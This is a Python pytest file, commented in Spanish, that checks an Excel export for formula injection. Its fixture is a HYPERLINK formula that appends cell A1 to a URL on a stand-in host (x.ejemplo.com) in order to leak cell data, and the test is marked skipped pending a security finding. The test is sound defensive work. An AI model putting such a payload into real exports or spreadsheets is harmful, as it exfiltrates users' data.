"""Revisión de seguridad F4 (HU 4.10 parte 2): el Excel exportado no ejecuta fórmulas que vengan de specs o guías."""

import io

import pytest
from apoyo_exportes import ATLAS
from openpyxl import load_workbook

from atlas_docs.exportes import Formato, PaqueteExportar, exportar

FORMULA = '=HYPERLINK("https://x.ejemplo.com/?d="&A1,"Ver detalle")'


def _paquete_con_formula() -> PaqueteExportar:
    return PaqueteExportar.model_validate(
        {
            "metadatos": {
                "paquete": "Paquete Demo",
                "revision": 1,
                "organizacion": "Organismo Demo",
                "fecha": "2026-10-24",
                "changelog": [{"revision": "1", "fecha": "2026-10-24", "cambio": FORMULA}],
            },
            "specs": [{"contrato": "atlas", "version": "1.0.0", "contenido": ATLAS.read_text(encoding="utf-8")}],
            "guias": [{"titulo": "Guía Demo", "markdown": FORMULA}],
        }
    )


@pytest.mark.skip(reason="Hallazgo F4-SEC-11")
def test_ninguna_celda_del_excel_es_una_formula() -> None:
    resultado = exportar(_paquete_con_formula(), {Formato.EXCEL})
    (archivo,) = resultado.por_formato(Formato.EXCEL)
    libro = load_workbook(io.BytesIO(archivo.datos))
    formulas = [
        f"{hoja.title}!{celda.coordinate}"
        for hoja in libro.worksheets
        for fila in hoja.iter_rows()
        for celda in fila
        if celda.data_type == "f"
    ]
    assert formulas == []
